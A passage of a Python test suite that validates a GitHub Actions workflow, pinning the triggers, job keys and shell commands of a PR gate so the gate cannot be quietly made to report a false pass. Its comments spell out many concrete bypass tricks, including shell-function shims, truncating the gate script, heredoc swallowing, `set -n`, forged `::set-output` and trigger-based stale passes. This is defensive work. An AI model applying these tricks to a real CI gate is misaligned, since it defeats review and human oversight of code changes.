        NOT_A_VERDICT = ("--list", "--requirements", "--help")
        pieces = tokens(ln)
        for i in range(0, len(pieces), 2):
            if opens(pieces[i]) and opens(pieces[i])[0] in TERMINATOR:
                return False
            if any(flag in pieces[i] for flag in NOT_A_VERDICT):
                continue
            if (pieces[i - 1].strip() if i else "") in ("&&", "||"):
                continue
            if runs_segment(pieces[i], "".join(pieces[i + 1:]), script, args_required):
                return True
        return False


    # Every textual assertion below reads the comment-stripped body. A rule about what the job
    # *does* must not be satisfiable by prose about what it does — and this file is heavily
    # commented, precisely because each setting is load-bearing. The sweep proved the point:
    # `fetch-depth: 0` is named in a comment two steps below the real setting, so flipping the
    # setting to 1 left the substring in place and the guard passed.
    body = strip_comments(wf)
    try:
        doc = parse_yaml(wf)
        parse_error = ""
    except YamlUnsupported as exc:
        doc, parse_error = {}, str(exc)
    check("the workflow is in the subset this suite can read structurally, so no key is invisible "
          "to the rules below", not parse_error, parse_error)

    # Handles both spellings of a YAML sequence, and the block form only because `str()` of the
    # parsed list happens to leave quotes that `.strip()` removes. Worth knowing before editing.
    def flow_list(scalar):
        return [w.strip().strip("'\"") for w in str(scalar).strip("[]").split(",") if w.strip()]

    # `paths:` was the filter this workflow exists to avoid, but it is not the only one that stops
    # the job running — and not running is a defect whichever way it reports (Pending for a filtered
    # workflow, success for an `if:`-skipped job). Read as keys rather than matched as text:
    # naming five forbidden filters left every other one permitted, and the quoting the rule had to
    # tolerate (`'paths':`) was a second spelling to remember. A whitelist needs neither.
    on = doc.get("on") or {}
    if isinstance(on, str):
        on = {w.strip(): None for w in on.strip("[]").split(",") if w.strip()}
    elif isinstance(on, list):
        on = {str(w): None for w in on}
    check("the trigger block is a mapping of events, the only spelling whose filters this suite can "
          "read", isinstance(doc.get("on"), dict), type(doc.get("on")).__name__)
    check("the workflow triggers on pull_request at all", "pull_request" in on, list(on))
    pr_trigger = on.get("pull_request")
    # `pull_request:` with an explicit `null`/`~` value — a legal spelling meaning "no filters" — used
    # to parse as the *string* 'null', so `set(…) - {"types"}` reported the letters n/u/l as three
    # filters and the next line crashed on `.get`. The reader now yields None for those, and anything
    # else that is not a mapping is coerced here, so the rules below always index a mapping.
    check("the pull_request trigger is a mapping of filters or has none at all, the two spellings "
          "whose filters the rules below can read",
          pr_trigger is None or isinstance(pr_trigger, dict), type(pr_trigger).__name__)
    if not isinstance(pr_trigger, dict):
        pr_trigger = {}
    # `types` is allowed only as a superset of the default three, which cannot skip a PR that the
    # default would have run. Rejecting it outright made the rule fire on a correct edit
    # (`types: [opened, synchronize, reopened, ready_for_review]`), and a rule that fires on correct
    # code is a rule someone deletes.
    DEFAULT_TYPES = {"opened", "synchronize", "reopened"}
    filters = sorted(set(pr_trigger or {}) - {"types"})
    for label, given, ok in (("the default three", DEFAULT_TYPES, True),
                             ("a superset of them", DEFAULT_TYPES | {"edited"}, True),
                             ("a set missing one of them", {"opened", "synchronize"}, False)):
        check(f"the types rule accepts {label}" if ok else f"the types rule rejects {label}",
              (given >= DEFAULT_TYPES) is ok, sorted(given))
    check("the pull_request trigger carries no filter that could skip the job and read as a pass",
          not filters, filters)
    # Unconditional, like every other rule here: writing this as `if "types" in trigger:` would make
    # the suite's own check count depend on the workflow, so adding a `types:` filter would trip the
    # count invariant — whose message asks the reader to update EXPECTED, i.e. to wave the filter
    # through. Absent `types`, the effective set *is* the default, so the same assertion holds.
    types = set(flow_list((pr_trigger or {}).get("types", ""))) or DEFAULT_TYPES
    check("the trigger's event types are a superset of the default three, so no PR is skipped",
          types >= DEFAULT_TYPES, types)
    # `edited` has to be named, because the default three do not include it and it is the event fired
    # when a PR's *base branch* changes. Without it a green check run survives a retarget onto a base
    # the gate never diffed — which is a stale pass, the exact failure this whole file is about, and it
    # needs no shell trick at all: two clicks in the PR header.
    check("`edited` is among them, so retargeting the base cannot leave a stale pass behind",
          "edited" in types, sorted(types))
    # A merge queue does not replay `pull_request`. A required check with no `merge_group` trigger is
    # never reported for the queued group and the documented outcome is a failed merge, so the trigger
    # is wired ahead of anyone enabling a queue rather than discovered by it.
    check("the workflow also triggers on merge_group, so a merge queue cannot deadlock on it",
          "merge_group" in on, list(on))
    # And nothing else, which is a whitelist for the same reason every other rule here is one. A
    # required check is satisfied by the *latest* check run of its name on the head SHA, so any
    # trigger that runs this workflow on a PR's head SHA publishes that PR's verdict. `merge_group`
    # is admitted because a queue cannot proceed without it; `workflow_dispatch` was admitted for
    # convenience and was a live bypass — dispatch on the PR branch, base ref empty, selection `--all`,
    # branch scope skipped, and the green supersedes the PR run's red. `push:` is the same hole
    # without the clicking. Enumerating the two acceptable triggers costs less than remembering which
    # of the thirty-odd others can land on a PR head SHA.
    check("the workflow triggers on nothing but those two, so no other event can publish this "
          "check's name on a PR's head SHA", set(on) == {"pull_request", "merge_group"}, sorted(on))

    # The job that runs the gate, found by what its steps do rather than by position. The rule this
    # replaces read "everything between `jobs:` and the first `- name:`" as a stand-in for the job,
    # so `if: false` appended after the steps list was outside the window, and a decoy job whose
    # first step preceded the real job's collapsed the window to nothing.
    def run_lines(step):
        """The step's executed lines, indentation preserved.

        An inline `run: cmd` scalar is stored without indentation, so `run_contents` broke out of the
        block on the first line and returned nothing — every rule that reads a step then saw an empty
        one, and a step spelled `run: id` was invisible to all of them. Defined once, above every
        caller: the first fix indented the body in `raw_shell_of` and left `step_runs` reading the raw
        scalar, so the same blind spot survived in the rule that finds the gate at all.
        """
        body = str(step.get("run", ""))
        if body and not body.startswith((" ", "\n")):
            body = "\n".join(" " * 10 + ln for ln in body.splitlines())
        return [ln for ln in run_contents("        run: |\n" + body) if ln.strip()]

    def step_runs(step, script, exclude=()):
        # Through `raw_shell_of`, which re-indents an inline `run:` scalar. Spelled out here once, it
        # read an inline step as empty — the same blind spot, fixed in one place and not the other.
        return any(executes(ln, script) and not any(x in ln for x in exclude)
                   for ln in run_lines(step))

    def job_with(script, exclude=()):
        found = [(name, job) for name, job in (doc.get("jobs") or {}).items()
                 if any(step_runs(s, script, exclude) for s in (job.get("steps") or []))]
        return found[0] if len(found) == 1 else (None, {})

    gate_job_name, gate_job = job_with("scripts/ai/pr_gate.py",
                                       exclude=("--requirements", "--list", "--help"))
    check("exactly one job runs the gate", gate_job_name, list(doc.get("jobs") or {}))
    # A whitelist of job keys, not a search for `if:`. `continue-on-error:` at job level, and
    # `defaults: {run: {shell: …}}` — which replaces the shell for *every* step in the job and so
    # needs no step edit at all — were both invisible to a rule that looked for one key.
    JOB_KEYS = {"name", "runs-on", "timeout-minutes", "steps"}
    check("the gate job carries only keys that cannot stop it running",
          not sorted(set(gate_job) - JOB_KEYS), sorted(set(gate_job) - JOB_KEYS))
    check("the workflow sets no defaults or env above the job, which would reach into every step",
          not ({"defaults", "env"} & set(doc)), sorted({"defaults", "env"} & set(doc)))
    # `exactly one job runs the gate` bounds the jobs that *invoke* the gate, not the jobs that exist.
    # A second job named `Mechanical checks` publishes a second check run under the string a branch
    # ruleset matches, which is the one name whose meaning lives outside this repo.
    # Broader than the hazard, deliberately: a job named `Docs lint` publishes `Docs lint` and
    # cannot satisfy `Mechanical checks`, so a second unrelated job is harmless *today*. What this
    # pins is that the set of check-run names this workflow publishes stays reviewed, because the
    # string a branch ruleset matches lives outside this repo and a rename here is invisible there.
    # Adding a job is therefore allowed — by editing this list, which is the review.
    PUBLISHED = ["Mechanical checks"]
    published = [(j.get("name") or key) for key, j in (doc.get("jobs") or {}).items()]
    check("the workflow publishes exactly the check-run names it was reviewed with (PUBLISHED) — the "
          "job *key* is free to be renamed, since a branch ruleset matches the `name:`; add a job by "
          "adding its published name here, which is the review",
          published == PUBLISHED, published)
    # Step keys, pinned per step. Two steps had this and four did not, and the four accepted
    # `if: false`, `continue-on-error: true` and `shell:` — which replaces the interpreter for the
    # step, so the run body this suite reads word by word would be handed to something else. None of
    # the four produces a false green today (neutralising the resolver selects `--all`, and the
    # installer's absence makes `${SEL}` unbound under `set -u`), but that is an argument about the
    # rest of the file, not about the step, and it is the argument that stops being true after an edit.
    STEP_KEYS = {"Checkout repository": {"name", "uses", "with"},
                 "Set up Python": {"name", "uses", "with"},
                 "Resolve the base ref": {"name", "id", "env", "run"},
                 "Install only what the selection needs": {"name", "env", "run"},
                 "Run the gate": {"name", "run"},
                 "Branch scope": {"name", "if", "env", "run"}}
    for step in gate_job.get("steps") or []:
        name = step.get("name")
        if name not in STEP_KEYS:
            # Not "this step has extra keys": an unknown name subtracts from an empty set, so the two
            # *legal* keys were printed as the offenders. Renaming a step is harmless — only the job
            # name is load-bearing for a branch ruleset — but it has to be done in both places.
            check(f"{name!r} is a step name this suite was written against; rename it in JOB_STEPS "
                  f"and STEP_KEYS together", False, sorted(STEP_KEYS))
            continue
        extra = sorted(set(step) - STEP_KEYS[name] - ALSO_FINE)
        check(f"{name!r} carries only the keys it was reviewed with (STEP_KEYS)", not extra, extra)
    # `shell` is admitted as a key and pinned by value: `bash` is the runner default on Linux and
    # reinterprets nothing, while `shell: "cat {0}"` — the documented threat, which makes the runner
    # print the script instead of executing it — is not `bash`.
    shells = {s.get("name"): s.get("shell") for s in (gate_job.get("steps") or []) if "shell" in s}
    check("any step that names a shell names bash, the runner default, and not an interpreter that "
          "would print the script instead of running it",
          all(v == "bash" for v in shells.values()), shells)
    # `timeout-minutes` is admitted because it cannot turn a failure into a pass — a cancelled job is
    # not a success. A zero, though, cancels the job every time, so the check could never pass at all.
    timeouts = {s.get("name"): s.get("timeout-minutes") for s in (gate_job.get("steps") or [])
                if "timeout-minutes" in s}
    check("a step timeout leaves the step time to run, so the check can pass at all",
          all(str(v).isdigit() and int(v) >= 5 for v in timeouts.values()), timeouts)
    # Two loops below run once per step, so adding a step moves the total count and the invariant at
    # the bottom of this file fails with "raise EXPECTED". That is deliberate and not a derivation:
    # deriving the terms from the workflow made them self-cancel, which is how a silenced loop kept
    # the count intact. Raising the literal by hand is the review step the failure exists to force.

    # Everything above reads one line, or one substring of the whole file. Neither can see the
    # *step* around a command, and that is where most of the ways to neutralise it live: a step
    # `if:` that is never true, `continue-on-error:`, a command that is no longer last in the body,
    # or a wrapper (`if …; then`, `&`, a heredoc, `$( )`) that runs it and drops its status. A
    # review enumerated 25 such mutations after the line-scoped rules reported every mutation
    # killed — the third time in this PR that a sweep's blind spot moved instead of closing.
    #
    # So the two load-bearing steps are read as steps and pinned to *one permitted shape* each.
    # That is a whitelist, and deliberately so: a blacklist has to imagine every way to break the
    # job, while a whitelist only has to describe the one way it is allowed to work. The cost is
    # that a legitimate edit to either step must update the rule — acceptable for two steps whose
    # entire purpose is to be hard to defang, and the failure names the constraint it broke.
    #
    # The first version of that whitelist split steps with a regex on `^      - (name|uses):` and
    # asked about keys with another regex. Fourteen mutations walked through it — a quoted key, an
    # unenumerated key, a key appended after the steps list, a decoy job — so the steps now come
    # from parse_yaml above and the rules read the mapping. What the whitelist permits did not
    # change; what it can *see* did.
    # `--requirements` and `--list` are excluded because neither exit code is a verdict: a step
    # left running only one of those would satisfy "the gate runs" while checking nothing.
    def steps_named(job, script, exclude=()):
        return [s for s in (job.get("steps") or []) if step_runs(s, script, exclude)]

    raw_shell_of = run_lines

    def shell_of(step):
        return [ln.strip() for ln in raw_shell_of(step)]

    def escapes_early(step):
        """Commands at the step's own indentation that end the shell. Reachability is a property of
        the whole step, not of one line: an `exit 0` on a line of its own leaves every per-line
        assertion about the checker below it — invoked, exit code captured, fork branch guarded,
        `--no-fetch` supplied — satisfied and unreached. Nesting is what makes an exit conditional,
        so the real `exit 2` inside the retry loop's `if` and the single-line `if …; then exit …; fi`
        (which opens with `if`) are both accepted; one at the top level is not.

        Read per *segment*, not per line prefix. Keyed on the first word of the line, this missed
        `true; exit 0` — first word `true;` — and `: && exit 0`, both of which end the shell before
        the checker runs while leaving every other assertion about it satisfied. Both were a live
        false green in the branch-scope step, whose commands `permitted()` all admits.
        """
        raw = raw_shell_of(step)
        base = min((len(ln) - len(ln.lstrip()) for ln in raw), default=0)

        def decided(operands):
            """Is this `[ … ]` test's outcome fixed before the shell runs it?

            Recognising only `a = a` was the same defect one operator wide: `[ 1 -eq 1 ]`,
            `[ 1 == 1 ]`, `[ 1 != 2 ]`, `[ -n x ]` and `[ -z '' ]` are every bit as decided and
            read as real tests. A test naming a *variable* is genuinely undecidable here and is
            treated as real, which is the safe direction.

            Two later corrections, in opposite directions. `!` and the `-a`/`-o` conjunctions push the
            operand count past three, and every branch below then fell through to `False` — so
            `[ ! 1 = 2 ]` and `[ 1 = 1 -a 1 = 1 ]`, both decided, read as real conditions and could
            guard an unconditional exit. They are reduced here instead. And `len(operands) in (1, 2)`
            called every *file* test decided — `-f`, `-d`, `-x`, `-e`, `-r`, `-w`, `-s` are runtime
            probes of the filesystem, so a legitimate early-out guarded by one was reported as an
            unconditional exit. Only `-n`/`-z` are decided by a literal operand.
            """
            if any("$" in w or "`" in w for w in operands):
                return False
            # `!` inverts a decided test into a decided test, so the answer is the same question
            # asked of the rest.
            while operands[:1] == ["!"]:
                operands = operands[1:]
            if not operands:
                return False
            # `-a`/`-o` are conjunctions of tests: decided iff every part is.
            for joiner in ("-a", "-o"):
                if joiner in operands:
                    idx = operands.index(joiner)
                    return decided(operands[:idx]) and decided(operands[idx + 1:])
            lit = [w.strip("\"'") for w in operands]
            if len(operands) == 3:
                a, op, b = lit
                if op in ("=", "==", "-eq"):
                    return True
                if op in ("!=", "-ne"):
                    return True
                if op in ("-lt", "-le", "-gt", "-ge"):
                    return a.lstrip("-").isdigit() and b.lstrip("-").isdigit()
                return False
            if len(operands) == 2:
                return operands[0] in ("-n", "-z")
            # The one-operand `[ x ]` — a non-empty literal is true, an empty one false.
            return len(operands) == 1

        def constant_test(seg):
            """A command whose status is decided before the shell runs it."""
            words = seg.split()
            while words and words[0] in KEYWORDS:
                words = words[1:]
            if words[:1] and words[0] in NO_OPS + ("echo", "printf"):
                return True
            if words[:1] and words[0] in TEST_CMDS:
                return decided([w for w in words[1:] if w not in ("]", "]]")])
            return False


        def conditional_before(pieces, idx):
            """Is this segment reached only when an earlier command actually succeeded or failed?

            The predecessor has to be able to go either way. Exempting on the operator alone made
            `: && exit 0` and `[ 1 = 1 ] && exit 0` read as conditional — the operator was there and
            the branch was decided anyway, which is the same mistake the opener exemption made one
            rule up.

            Returns (conditional, after_failure). The second value says whether the segment is
            reached on a *failure* — true for `||`, false for `&&` — because `exit $?` hands on a
            status only when the thing before it failed. After `&&` the predecessor succeeded, `$?`
            is 0, and `sleep 0 && exit $?` ended the step clean before the checker ran.
            """
            conditional, after_failure = False, False
            for j in range(1, idx, 2):
                op = pieces[j].strip()
                if op in ("&&", "||") and not constant_test(pieces[j - 1]):
                    conditional = True
                    if op == "||":
                        after_failure = True
            return conditional, after_failure

        def terminates(ln):
            # A line that *opens a block* keeps its exit conditional, which is how the real
            # `if [ "$code" -ne 2 ]; then exit "$code"; fi` stays acceptable. Anything else at the
            # step's own indentation reaches its `exit` on the way through.
            #
            # A terminator after `&&` or `||` is the exception, and it has to be: the re-raising
            # handler `python … || { echo "::error::…"; exit 1; }` — which this file calls a correct
            # edit in two other places — reaches its `exit` only when the gate has already failed.
            # Read segment-wise with no such test, this rule rejected it, which would have made the
            # documented advice fail CI. A predecessor whose outcome is already decided does not earn
            # that exemption, though — `conditional_before` refuses `: && exit 0` and
            # `[ 1 = 1 ] && exit 0` directly, so neither depends on the whitelist to catch it.
            #
            # The opener must carry an actual test, and the test must be able to go either way.
            # Exempting on the keyword alone accepted `if : ; then exit 0; fi` and
            # `while :; do exit 0; done`, which are as unconditional as a bare `exit 0` — the keyword
            # was doing the exempting and the condition was decorative. Exempting on "there is a
            # test" then accepted `if [ 1 = 1 ]; then exit 0; fi`, so the test itself is now read:
            # `decided()` says whether its answer is fixed before the shell runs it, over every
            # comparison operator and both unary forms rather than `=` alone.
            first = ln.split()[:1]
            if first and first[0] in SHELL_OPENERS:
                cond = next((seg for seg, _ in parts(ln)), "")
                words = cond.split()[1:]
                real = words[:1] and words[0] in SHELL_TEST_CMDS
                # `[ 1 = 1 ]` is a test and always true, so it conditions nothing. Read off the
                # opener's own segment, not the whole line: scanning the line exempted
                # `if grep -q test x; then exit 0; fi`, where the word `test` is an argument.
                constant = decided([w for w in words[1:] if w not in ("]", "]]")])
                if real and not constant:
                    return False
            pieces = tokens(ln)
            for i in range(0, len(pieces), 2):
                seg_words = pieces[i].split()
                while seg_words and seg_words[0] in KEYWORDS:
                    seg_words = seg_words[1:]
                if not (seg_words[:1] and seg_words[0] in TERMINATOR):
                    continue
                conditional, after_failure = conditional_before(pieces, i)
                if conditional and reraises(seg_words, after_failure):
                    continue
                return True
            return False

        return [ln.strip() for ln in raw
                if len(ln) - len(ln.lstrip()) == base and terminates(ln)]

    # A workflow command needs no redirection at all: the runner parses `::` on a step's *stdout*.
    # `echo "::set-output name=ref::HEAD"` sets the base-ref output that `ALLOWED_REF` exists to pin,
    # through a channel whose subject set — writes to the four GitHub files — cannot contain it by
    # construction, and it passes as an ordinary `echo`. The state-changing commands are excluded by
    # name (`set-output`, `save-state`, `set-env`, `add-path`, `add-matcher`, `stop-commands`); the
    # display-only ones are allowed, because banning `::` outright rejected two edits this file
    # itself calls correct — a re-raising `|| { echo "::error::…"; exit 1; }` handler and a trailing
    # `::notice::`. Matched as a *whole segment* rather than by where `::` appears, which is what
    # makes it safe: `echo -e "\n::set-output name=ref::HEAD"` carries a flag and fails the anchor,
    # and that spelling is exactly why a position-based exception would not work.
    ANNOTATION = re.compile(r'^echo "::(warning|notice|error|debug|group|endgroup)::[^"]*"$')

    def annotation_only(seg):
        # Leading block keywords come off first. Anchored on `echo`, the rule refused the brace-group
        # handler `|| { echo "::error::…"; exit 1; }` that the comment above calls a correct edit — the
        # segment starts `{ echo`. The anchor is what makes the exception safe, so the keywords are
        # stripped rather than the anchor loosened.
        words = seg.split()
        while words and words[0] in KEYWORDS:
            words = words[1:]
        return "::" not in seg or bool(ANNOTATION.match(" ".join(words)))

    # Block keywords are not commands: `then exit 2` runs `exit`, `{ echo x` runs `echo`.
    # The two steps' whole vocabulary: `set`, a conditional, `echo`, `exit`, `sleep`, `git fetch`,
    # the two scripts, and four variables. Small enough to whitelist, which is why this is possible
    # here and would not be for an arbitrary step.
    # `printf` is deliberately absent: it is the one word here that writes shell state. `printf -v SEL
    # %s '--base HEAD'` contains no `SEL=` substring, so the rule pinning the two SEL spellings never
    # sees it, and no assignment rule can — the assignment is in the argument list. It survived eleven
    # rounds of these guards and produced the exact false green they exist to stop: an empty diff, 13
    # checks skipped, exit 0. It gets its own branch below rather than a word.
    HARMLESS = ("echo", "exit", "return", "sleep", ":", "true", "false")
    # The test commands and the no-op commands, named once each. Three copies of these lists with
    # three different contents is what rejected `[[ … ]]` and `while true` — both accepted elsewhere
    # in this same file. A vocabulary spread across N places is a vocabulary with N answers.
    TEST_CMDS, NO_OPS, OPENERS = SHELL_TEST_CMDS, SHELL_NO_OPS, SHELL_OPENERS
    # Both refspecs and both verifies, pinned by form — see the `git` branches. Order-*insensitive*
    # for flags, because git's flags are order-free and this rule used to concede in a comment that it
    # rejected `git rev-parse --quiet --verify …`, the same command respelled. Conceding a false
    # rejection in a comment is not fixing it: the reader who hits it gets the failure, not the
    # comment. Flags are compared as a set and positional arguments in order, so a reordering passes
    # and an added refspec or a changed ref does not. The redirection tail is normalised too
    # (`>/dev/null`, `> /dev/null`, `2>/dev/null`, `2>&1` are all the same argv).
    GIT_FORMS = ('git rev-parse --verify --quiet "origin/${BASE_REF}"',
                 'git fetch --no-tags origin '
                 '"+refs/heads/${BASE_REF}:refs/remotes/origin/${BASE_REF}"',
                 'git fetch --no-tags origin "pull/${PR}/head:pr-${PR}"')

    def canonical_shell(line):
        """Normalise the spellings bash treats as identical, so a pin compares meaning not text.

        `[[ … ]]` is `[ … ]` with no word-splitting, and `while true` is `while :`. Every other rule
        in this file already accepts both spellings; comparing text here refused them, which is the
        same vocabulary answered differently in a fourth place. Defined here rather than beside
        `control_flow`, its second caller: the fork-branch pin is its first, ~600 lines earlier.
        """
        line = re.sub(r"\[\[", "[", re.sub(r"\]\]", "]", line.strip()))
        # `true` only, never `false`. Written `(?:true|false)` this mapped `while false; do` onto the
        # pinned `while :; do` — canonicalising a condition to its own opposite, so the retry loop
        # could be falsified and read as reviewed. A probe aimed at this loosening caught it before it
        # shipped; the whole reason loosenings get probes.
        return re.sub(r"\btrue\b(?=\s*;)", ":", line)

    def strip_redir(text):
        return re.sub(r"\s*\d*>>?\s*&?\s*\S+", "", text).strip()

    def argv_shape(text):
        """(command, frozenset of flags, tuple of positionals) — argv with flag order removed.

        Only the *order* of flags is discarded. A flag that is not in the pinned form, a missing one,
        or any change to a positional (a refspec, a ref name) still differs, which is the whole
        property; what stops differing is `--quiet --verify` versus `--verify --quiet`.
        """
        words = strip_redir(text).split()
        flags = frozenset(w for w in words[1:] if w.startswith("-"))
        positionals = tuple(w for w in words[1:] if not w.startswith("-"))
        return (words[:1] and words[0], flags, positionals)

    GIT_SHAPES = frozenset(argv_shape(f) for f in GIT_FORMS)

    def git_form_ok(text):
        return argv_shape(text) in GIT_SHAPES
    # Pinned for the same reason as `set`: `permitted()` used to accept a segment whose *first*
    # word was an allowed assignment and read no further, so `code=0 eval 'python() { return 0; }'`
    # passed as an assignment while defining a shim — a prefix assignment is a command's environment,
    # not a command in itself.
    ALLOWED_ASSIGN = ("attempt=1", "code=$?", "attempt=$((attempt + 1))",
                      'SEL="--all"', 'SEL="--base ${BASE}"')
    SCRIPTS = ("scripts/ai/pr_gate.py", "scripts/ai/check_branch_scope.py")
    # `set` was in HARMLESS, which is the same mistake this round already fixed for `git` and
    # `python`: a builtin whose *arguments* decide what runs is not harmless. `set --` builds the
    # checker's argv, so appending `set -- --base HEAD --head HEAD --no-fetch` before the retry loop
    # leaves every earlier assertion true — the `--pr` form is still there, `--no-fetch` is still
    # there — while the checker compares HEAD with itself and exits clean. The four forms are
    # therefore pinned; changing the fork path's refs must update this list, which is the cost of
    # pinning argv and is the right cost to pay here.
    ALLOWED_SET = ("set -euo pipefail", "set -e", "set +e", "set -f", "set +f",
                   'set -- --base "origin/${BASE_REF}" --head "pr-${PR}"',
                   'set -- --pr "${PR}"',
                   'set -- "$@" --no-fetch')

    def set_flags_ok(line):
        """Does this `set` line still abort on error and refuse unset variables?

        Matched with `[a-z]` this rejected `set -Eeuo pipefail` — bash confirms `errexit`,
        `nounset` and `pipefail` are all still on — and then reported that the step no longer aborts
        on the first error, which is the worst thing a message can do. Flags are read as a set, so
        additional letters are fine and dropping `e` or `u` is not.

        Except `n`. `set -n` makes bash *read* commands without executing them, so `set -neuo
        pipefail` keeps both required flags, satisfies every other rule, runs nothing and exits 0 —
        a live false green the first cut of this helper admitted. A probe aimed at the loosening
        found it; anything that decides whether commands run at all is not a "spelling".
        """
        m = re.fullmatch(r"set -([A-Za-z]+)o pipefail|set -([A-Za-z]+) -o pipefail",
                         line.strip())
        if not m:
            return False
        flags = set(m.group(1) or m.group(2))
        return {"e", "u"} <= flags and not (flags & {"n", "N"})

    def set_line_ok(words):
        """Is this a `set` line from the allowed list, or one of them with extra flags?

        `set -euxo pipefail` adds tracing and drops nothing, so pinning the text rejected a correct
        edit at both scopes. The required letters are checked, not the spelling.
        """
        joined = " ".join(words)
        if joined in ALLOWED_SET:
            return True
        return set_flags_ok(joined)

    def interpreter(word):
        """`python3` is the same interpreter as `python` after setup-python."""
        return "python" if word == "python3" else word

    def permitted(seg):
        """Whether one segment runs something the step is supposed to run.

        Words, not forms, was the first attempt, and three of five self-authored escapes walked
        through it: whitelisting `python` admits `python -c '…' scripts/ai/pr_gate.py`, which reads
        the gate as data and exits 0; whitelisting `git` admits `git checkout HEAD~50 -- scripts/ai/`,
        which silently restores an older checker. So a command that takes a subcommand is pinned to
        the subcommand, and a conditional to a *test* — `if rm -f …; then` is a conditional whose
        condition is an arbitrary command.
        """
        words = seg.split()
        while words and words[0] in KEYWORDS:
            words = words[1:]
        if not words:
            return True
        # Before the vocabulary, because `echo` is in it and a workflow command is just an echo the
        # runner reads off stdout. Both whitelists admit `echo`, so both need this.
        if not annotation_only(seg):
            return False
        if words[0] in HARMLESS:
            return True
        if words[0] == "printf":
            return "-v" not in words
        if words[0] == "set":
            return set_line_ok(words)
        if words[0] in OPENERS:
            # `for` takes a word list, not a command, so its operand is not a command to whitelist —
            # `for attempt in 1 2 3` is a bounded respelling of the retry loop and was refused for
            # having no branch here at all.
            return words[0] == "for" or (words[1:2] and words[1] in TEST_CMDS + NO_OPS)
        if words[0] == "git":
            # This step is the one carrying a `git fetch`, so accepting the subcommand and ignoring the
            # refspec meant the narrow rule was looser than the job-wide one about the very command it
            # guards. Same pin, one source.
            return git_form_ok(" ".join(words))
        if interpreter(words[0]) == "python":
            return words[1:2] and words[1] in SCRIPTS
        if re.match(r"^[A-Za-z_][A-Za-z_0-9]*=", words[0]):
            # Compared with whitespace removed, so `attempt=$((attempt+1))` — a correct respelling
            # that the first cut of this rule rejected — is accepted. Nothing in the permitted list
            # can collide once spaces go: the only one with a quoted space is `--base ${BASE}`.
            return re.sub(r"\s+", "", seg) in [re.sub(r"\s+", "", f) for f in ALLOWED_ASSIGN]
        return False

    # Pinning argv is worthless if the command can ignore it: `python …check_branch_scope.py --base
    # HEAD --head HEAD --no-fetch` never expands `"$@"`, so every `set --` form stays in the file,
    # permitted and unused, while the checker compares HEAD with itself. The gate has the same shape
    # with `${SEL}`. So the invoking segment itself is pinned — the handler that may follow `||` is a
    # later segment and is unaffected.
    GATE_CMD = "python scripts/ai/pr_gate.py ${SEL}"
    SCOPE_CMD = 'python scripts/ai/check_branch_scope.py "$@"'

    def same_argv(got, want):
        """Compare an invocation to its pin, treating `python3` as `python`.

        After `setup-python` the two names are the same interpreter and produce the same exit code,
        so rejecting one of them was a pin firing on a respelling that changes nothing. Only the
        interpreter word is normalised; every argument stays pinned.
        """
        return re.sub(r"^python3(?=\s)", "python", got.strip()) == want

    def argv_in(got, wants):
        """`same_argv` against several pins. All four comparison sites go through here."""
        return any(same_argv(got, w) for w in wants)

    def invoking_segment(ln, script):
        for seg, tail in parts(ln):
            if runs_segment(seg, tail, script):
                return " ".join(seg.split())
        return ""

    def foreign_commands(step):
        """Segments of a step that run something outside its vocabulary.

        The rules above ask what the *invocation* is, and exempt the line carrying it — which leaves
        everything else on that line unread: `python() { return 0; }; python …pr_gate.py ${SEL}`
        satisfies "one command executes the gate" while bash calls a shell function that returns 0.
        The branch-scope step was worse still, having no per-segment rule at all, so a shim could sit
        anywhere in it. Shadowing has too many spellings to enumerate — a function, `alias`, `eval`,
        `hash -p`, `export PATH=`, a bare `PATH=` — so the question asked is the whitelist one:
        is every segment one of the handful of commands this step exists to run?
        """
        return [seg.strip() for ln in shell_of(step)
                for seg, _tail in parts(ln) if not permitted(seg)]

    # The writes a step is allowed to hand a later one, and the predicates that read them.
    # Defined here rather than beside their checks because `rewrites()` below has to ask the
    # same question: it refuses every redirection, and three other rules advertise
    # `$GITHUB_STEP_SUMMARY` as a permitted destination, so a summary written from the gate
    # step was refused by one rule and allowed by three — the disagreement this file calls a
    # defect, one rule over from where it was fixed.
    ALLOWED_WRITES = ('echo "SEL=${SEL}" >> "$GITHUB_ENV"',
                      'echo "ref=" >> "$GITHUB_OUTPUT"',
                      'echo "ref=origin/${BASE_REF}" >> "$GITHUB_OUTPUT"')
    WRITE_DEST = re.compile(r'>>?\s*"?\$\{?GITHUB_(ENV|PATH|OUTPUT|STEP_SUMMARY)\}?')

    def hands_over(ln):
        """Does this line write to one of the four files a step uses to reach a later one?"""
        return bool(WRITE_DEST.search(ln))

    # Whitespace around `>>` is not part of the property, and requiring exactly one space either
    # side rejected `echo "x">>"$GITHUB_STEP_SUMMARY"` — a correct line.
    SUMMARY = re.compile(r'^echo "[^"]*"\s*>>\s*"?\$\{?GITHUB_STEP_SUMMARY\}?"?$')
    # And the rider is the class, so a line that writes to a GitHub file must be *one* segment. Fixing
    # only the regex would leave `echo "/tmp/shim" >> "$GITHUB_PATH" ; echo "x" >> "$GITHUB_ENV"` and
    # every other separator to be found one at a time.
    def rides(ln):
        """A write line carrying anything besides the write."""
        return hands_over(ln) and len(list(parts(ln))) > 1

    def permitted_write(ln):
        return ln.strip() in ALLOWED_WRITES or bool(SUMMARY.match(ln.strip()))


    def rewrites(step):
        """Segments that change what the step runs instead of running it.

        All three escape a whitelist of commands while using only whitelisted ones. An *output*
        redirection can truncate the very script about to be invoked — `echo -n >
        scripts/ai/pr_gate.py` opens with a permitted `echo` and leaves an empty file that exits 0.
        A command substitution smuggles an arbitrary command inside a permitted one. And an *input*
        redirection is the subtlest: `echo disabled <<'echo'` makes the following line the heredoc's
        body, so the gate invocation becomes data — every line still reads as a permitted command to
        this suite, and bash runs one echo and exits 0. Neither step needs any of the three;
        `$(( ))` arithmetic, which the retry loop does need, is not a substitution.
        """
        return [ln for ln in shell_of(step)
                if not (permitted_write(ln) and not rides(ln))
                and (">" in ln or "<" in ln or re.search(r"\$\((?!\()", ln) or "`" in ln)]

    def pure_echo(ln):
        """One segment, and that segment is an echo. `startswith("echo ")` was a *prefix* test, so
        `echo "disabled" && exit 0` and `echo "shim"; python() { return 0; }` both satisfied it while
        making the gate that follows either unreachable or a no-op."""
        segs = parts(ln)
        return len(segs) == 1 and segs[0][0].split()[:1] == ["echo"]

    found_gate = steps_named(gate_job, "scripts/ai/pr_gate.py",
                             exclude=("--requirements", "--list", "--help"))
    # Reachability for the other shell steps, and stated precisely, because the first version of this
    # comment claimed an early exit there "ends the job" — each `run:` is its own shell, so it ends
    # that *step*, successfully, and the job continues. What it actually costs: the resolver exits
